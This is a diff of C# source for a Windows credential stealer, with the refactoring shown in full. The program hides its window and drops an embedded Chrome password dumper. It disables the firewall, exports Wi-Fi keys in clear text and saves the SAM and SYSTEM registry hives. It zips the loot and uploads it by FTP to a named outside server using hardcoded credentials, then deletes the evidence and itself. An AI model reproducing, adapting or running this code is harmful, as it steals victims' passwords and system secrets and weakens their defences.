@@ -1,9 +1,8 @@
 ﻿using System.Diagnostics;
+using System.IO.Compression;
 using System.Net;
 using System.Reflection;
-using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
-using static System.Net.Mime.MediaTypeNames;
 #pragma warning disable SYSLIB0014 
 namespace a
 {
@@ -14,17 +13,38 @@ namespace a
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        const int SW_HIDE = 0;
-        const int SW_SHOW = 5;
         public static string username = Environment.UserName;
-        public static string tmppath = Path.GetTempPath();
+        public static string TempPath = Path.GetTempPath();
+        public static string zipFileName = $"{username}_files.zip";
+        public static string zipFilePath = Path.Combine(TempPath, zipFileName);
         static void Main(string[] args)
         {
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
-            string username = Environment.UserName;
-            string tmppath = Path.GetTempPath();
+            ShowWindow(GetConsoleWindow(), 0);
             Delete();
+            GetChromePass();
+            PowershellCommand($"netsh advfirewall set allprofiles state off;cd {TempPath};./cp.exe /stext {username};netsh wlan export profile key=clear;reg save HKLM\\sam ./sam{username}.save; reg save HKLM\\system ./system{username}.save");
+            Upload();
+            Delete();
+            SelfDestruct();
+        }
+        private static void Delete()
+        {
+            if (File.Exists(zipFilePath))
+                File.Delete(zipFilePath);
+            if (File.Exists(Path.Combine(TempPath, "cp.exe")))
+                File.Delete(Path.Combine(TempPath, "cp.exe"));
+            if (File.Exists(Path.Combine(TempPath, $"system{username}.save")))
+                File.Delete(Path.Combine(TempPath, $"system{username}.save"));
+            if (File.Exists(Path.Combine(TempPath, $"sam{username}.save")))
+                File.Delete(Path.Combine(TempPath, $"sam{username}.save"));
+            if (File.Exists(Path.Combine(TempPath, username)))
+                File.Delete(Path.Combine(TempPath, username));
+            foreach (var file in Directory.GetFiles(TempPath, "*.xml"))
+                if (File.Exists(file))
+                    File.Delete(file);
+        }
+        private static void GetChromePass()
+        {
             Assembly currentAssembly = Assembly.GetExecutingAssembly();
             Stream? resourceStream = currentAssembly.GetManifestResourceStream("a.cp.exe");
             if (resourceStream != null)
@@ -33,44 +53,11 @@ namespace a
                 {
                     byte[] resourceBytes = new byte[resourceStream.Length];
                     resourceStream.Read(resourceBytes, 0, resourceBytes.Length);
-                    File.WriteAllBytes(Path.Combine(tmppath, "cp.exe"), resourceBytes);
+                    File.WriteAllBytes(Path.Combine(TempPath, "cp.exe"), resourceBytes);
                 }
             }
-            ExecuteCommand($"netsh advfirewall set allprofiles state off;cd {tmppath};./cp.exe /stext {username};netsh wlan export profile key=clear;reg save HKLM\\sam ./sam{username}.save; reg save HKLM\\system ./system{username}.save");
-            var client = new WebClient();
-            client.Credentials = new NetworkCredential("hack123", "Dr0bnyy");
-            client.UploadFile(new Uri($"ftp://konik.endora.cz/{username}"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, username));
-            client.UploadFile(new Uri($"ftp://konik.endora.cz/sam{username}.save"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"sam{username}.save"));
-            client.UploadFile(new Uri($"ftp://konik.endora.cz/system{username}.save"), WebRequestMethods.Ftp.UploadFile, Path.Combine(tmppath, $"system{username}.save"));
-            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
-                client.UploadFile(new Uri($"ftp://konik.endora.cz/{file.Substring(file.LastIndexOf('\\') + 1)}"), WebRequestMethods.Ftp.UploadFile, file);
-            Delete();
-            string batchCommands = string.Empty;
-            var process = Process.GetCurrentProcess().MainModule;
-            string exeFileName = process != null ? process.FileName : $"C:\\\\Users\\\\{username}\\\\Desktop\\\\a.exe";
-            Process.Start(new ProcessStartInfo()
-            {
-                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exeFileName + "\"",
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-                FileName = "cmd.exe"
-            });
         }
-        private static void Delete()
-        {
-            if (File.Exists(Path.Combine(tmppath, "cp.exe")))
-                File.Delete(Path.Combine(tmppath, "cp.exe"));
-            if (File.Exists(Path.Combine(tmppath, $"system{username}.save")))
-                File.Delete(Path.Combine(tmppath, $"system{username}.save"));
-            if (File.Exists(Path.Combine(tmppath, $"sam{username}.save")))
-                File.Delete(Path.Combine(tmppath, $"sam{username}.save"));
-            if (File.Exists(Path.Combine(tmppath, username)))
-                File.Delete(Path.Combine(tmppath, username));
-            foreach (var file in Directory.GetFiles(tmppath, "*.xml"))
-                if (File.Exists(file))
-                    File.Delete(file);
-        }
-        private static void ExecuteCommand(string command)
+        private static void PowershellCommand(string command)
         {
             var processStartInfo = new ProcessStartInfo();
             processStartInfo.Verb = "runas";
@@ -84,6 +71,40 @@ namespace a
             process.Start();
             string output = process.StandardOutput.ReadToEnd();
             Console.WriteLine(output);
+        }
+        private static void Upload()
+        {
+
+            using (ZipArchive zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create))
+            {
+                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, username), username);
+                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, $"sam{username}.save"), $"sam{username}.save");
+                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, $"system{username}.save"), $"system{username}.save");
+
+                foreach (var file in Directory.GetFiles(TempPath, "*.xml"))
+                {
+                    zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
+                }
+            }
+
+            using (var client = new WebClient())
+            {
+                client.Credentials = new NetworkCredential("hack123", "Dr0bnyy");
+                client.UploadFile(new Uri($"ftp://konik.endora.cz/{zipFileName}"), WebRequestMethods.Ftp.UploadFile, zipFilePath);
+            }
+        }
+
+        private static void SelfDestruct()
+        {
+            var process = Process.GetCurrentProcess().MainModule;
+            string exeFileName = process != null ? process.FileName : $"C:\\\\Users\\\\{username}\\\\Desktop\\\\a.exe";
+            Process.Start(new ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exeFileName + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
         }
     }
 }
